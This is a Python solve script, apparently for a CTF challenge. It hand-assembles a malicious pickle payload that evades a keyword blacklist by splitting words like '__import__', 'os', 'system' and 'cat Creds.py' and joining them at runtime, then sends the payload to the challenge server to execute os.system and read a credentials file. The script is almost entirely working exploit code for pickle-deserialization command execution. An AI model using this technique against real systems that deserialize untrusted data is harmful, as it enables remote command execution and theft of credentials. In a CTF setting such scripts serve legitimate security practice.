from pickletools import *
from base64 import b64encode
import socket

from pickleassem import PickleAssembler
# A simple pickle assembler to make handcrafting pickle bytecode easier.
# See: https://github.com/gousaiyang/pickleassem

SERVER = 'challs.nusgreyhats.org'   # Update accordingly
PORT = 33402

mem = 0
joinKey = None
def push_join(pa):
    global joinKey, mem
    if joinKey:
        pa.memo_binget(joinKey)
    else:
        pa.push_global('builtins','getattr')
        pa.push_short_binunicode('')
        pa.push_short_binunicode('join')
        pa.build_tuple2()
        pa.build_reduce()
        pa.memo_memoize()
        joinKey = mem
        mem += 1

def push_word2(pa, w1, w2):
    push_join(pa)
    pa.push_short_binunicode(w1)
    pa.push_short_binunicode(w2)
    pa.build_tuple2()
    pa.build_tuple1()
    pa.build_reduce()

def push_word3(pa, w1, w2, w3):
    push_join(pa)
    push_join(pa)
    pa.push_short_binunicode(w1)
    pa.push_short_binunicode(w2)
    pa.build_tuple2()
    pa.build_tuple1()
    pa.build_reduce()
    pa.push_short_binunicode(w3)
    pa.build_tuple2()
    pa.build_tuple1()
    pa.build_reduce()


pa = PickleAssembler(proto=4)

pa = PickleAssembler(proto=4)
pa.push_global('builtins','getattr')
pa.push_short_binunicode('builtins')    # [ getattr  'builtins' ]
push_word2(pa,'__imp', 'ort__')         # [ getattr  'builtins'  '__import__' ]
pa.build_stack_global()                 # [ getattr  __import__ ]
push_word2(pa, 'o', 's')                # [ getattr  __import__  'os' ]
pa.build_tuple1()                       # [ getattr  __import__  ('os',) ]
pa.build_reduce()                       # [ getattr  os ]
push_word2(pa, 'sy', 'stem')            # [ getattr  os  'system' ]
pa.build_tuple2()                       # [ getattr  (os, 'system') ]
pa.build_reduce()                       # [ os.system ]
push_word3(pa, 'ca', 't Cr', 'eds.py')  # [ os.system  'cat Creds.py' ]
pa.build_tuple1()                       # [ os.system  ('cat Creds.py',) ]
pa.build_reduce()                       # executes os.system('cat Creds.py')


payload = pa.assemble()
payload_b64 = b64encode(payload)

# For Debugging
# dis(payload, annotate=1)
print(f'Your serialized payload : {payload}\n')

print('[DEBUG] Checking against blacklist...',end='')
for word in ('os', 'sys', 'system', 'sh', 'cat', 'import', 'open', 'file', 'globals', 'Creds'):
    if word.encode() in payload:
        raise KeyError(f'\nThe pickle is spoilt :( {word}')
print(' ok.\n')

print(f'Your Evil Token : {payload_b64}\n')


sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect((SERVER,PORT))  

sock.recv(1024)
try:
    sock.recv(1024)
    # for some reason, sometimes the first recv doesnt collect everything
except:
    pass
sock.send("e\n".encode())
sock.recv(1024)

sock.send(payload_b64+b'\n')
print(f'Admin password (aka flag) is {sock.recv(84).decode()[29:]}')